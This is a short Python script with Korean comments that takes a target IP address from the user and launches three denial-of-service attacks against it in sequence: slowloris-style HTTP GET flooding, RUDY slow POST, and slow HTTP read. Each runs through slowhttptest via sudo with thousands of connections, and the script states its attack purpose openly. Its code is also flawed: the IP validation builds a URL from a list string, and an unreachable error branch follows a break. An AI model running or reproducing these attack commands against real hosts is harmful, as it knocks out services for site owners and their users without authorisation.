import re
import os

# Download slowloris attack tools and at api.
os.system('sudo apt-get install slowhttptest')
os.system('sudo apt-get install etherape')
os.system('sudo apt install at')

while True:
    ip = input('What is IP address?')
    ip_candidates = str(re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", ip)) # ip 정합성을 확인하기 위한 regex 정규표현식에 필터링함.
    print(f'{ip_candidates} is validated.')
    re.match(ip_candidates, ip)  # regex 함수를 통해 ip 정합성을 통과한 ip_candidates가 ip에 매칭하면, True 결과값 받음.

    # HTTP GET flooding 공격 블럭
    print(f'To attack {ip_candidates} through HTTP GET Flooding get started.')
    os.system(f'sudo slowhttptest -c 4000 -g -o slowloris -i 10 -r 100 -t GET -x 3 -p 3 -u http://{ip_candidates}')
    print(f'To attack {ip_candidates} is ongoing. In 3 minutes, it is going to attack through RUDY slowloris.')
    os.system('sudo at now+3 minutes')  # 공격 타이밍 3분 확인 후 'ctrl + D' 키 눌러서 at 모드 빠져나오면 다음 공격 재계함.

    # RUDY 공격 블럭
    print(f'To attack {ip_candidates} through RUDY slowloris get started.')
    os.system(
        f'sudo slowhttptest -B -c 4000 -i 100 -r 200 -s 4096 -t WHACKUR -x 3 -g -o rudy -u http://{ip_candidates}')
    print(f'To attack {ip_candidates} is ongoing. In 3 minutes, it is going to attack through HTTP READ slowloris.')
    os.system('sudo at now+3 minutes')  # 공격 타이밍 3분 확인 후 'ctrl + D' 키 눌러서 at 모드 빠져 나오면 다음 공격 재계함.

    # HTTP READ 공격 블럭
    print(f'To attack {ip_candidates} through HTTP READ get started.')
    os.system(f'sudo slowhttptest -X -c 1 -r 200 -w 10 -y 20 -n 5 -z 32 -g -o slowread -p 3 -u http://{ip}')
    print(f'To attack {ip_candidates} is terminated.')  # 공격 종료
    break
    if ip == False:
        print(f'{ip} is out of IP address range.')
